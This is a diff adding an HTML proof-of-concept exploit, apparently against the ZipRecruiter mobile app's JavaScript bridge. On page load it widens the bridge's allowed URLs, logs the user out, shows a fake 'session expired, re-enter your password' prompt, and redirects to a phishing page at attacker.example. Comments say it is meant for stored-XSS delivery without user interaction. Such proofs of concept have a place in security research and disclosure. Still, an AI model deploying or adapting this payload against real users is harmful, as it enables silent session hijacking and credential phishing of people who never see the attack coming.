@@ -1,0 +1,36 @@
+<!doctype html>
+<!--
+  Silent variant of poc.html: no buttons, fires the headline chain automatically
+  on page load with a 1500ms delay so the user has not yet had time to look at
+  the page. Useful for stored-XSS where the attacker doesn't get user interaction.
+
+  Chain executed:
+    1.  setAllowedUrls(['.*'])              - keep bridge attached across navs
+    2.  logout()                            - wipe session
+    3.  enableConfirmCloseModal(...)        - fake "Session expired" prompt
+
+  After the user "re-authenticates" through the modal (which is rendered by the
+  native app), the attacker page can phish credentials via a controlled form.
+-->
+<html><head><meta charset="utf-8"><title>…</title></head>
+<body>
+<script>
+(function () {
+  if (typeof MobileClient === "undefined") return;
+  setTimeout(function () {
+    try { MobileClient.setAllowedUrls([".*"]); } catch (_) {}
+    try { MobileClient.logout(); } catch (_) {}
+    try {
+      MobileClient.enableConfirmCloseModal(
+        "Re-enter your password",
+        "Your ZipRecruiter session expired. Tap Continue to keep your application.",
+        "Continue",
+        "Cancel"
+      );
+    } catch (_) {}
+    // Optional: redirect to attacker phishing form. Allowed because of setAllowedUrls above.
+    setTimeout(function () { location.href = "https://attacker.example/zr-signin.html"; }, 800);
+  }, 1500);
+})();
+</script>
+</body></html>
